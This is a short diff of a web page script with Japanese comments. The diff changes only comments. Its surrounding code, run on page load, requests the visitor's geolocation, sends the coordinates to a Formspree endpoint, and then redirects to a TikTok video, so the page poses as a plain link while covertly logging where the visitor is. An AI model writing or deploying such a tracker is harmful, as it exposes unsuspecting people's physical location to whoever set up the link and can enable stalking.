@@ -9,6 +9,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
             } else {
+                // 位置情報取得に失敗した場合もリダイレクト
                 redirectNow();
             }
         }
@@ -17,7 +18,7 @@
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
 
-            // FormspreeのフォームURLにPOSTリクエスト
+            // ここで位置情報を送信する処理
             fetch("https://formspree.io/f/xanedrka", {
                 method: "POST",
                 headers: { 
@@ -28,7 +29,8 @@
         }
 
         function redirectNow() {
-            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // リダイレクト先のURL
+            // 位置情報の有無に関係なくリダイレクト
+            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513");
         }
 
         getLocation();
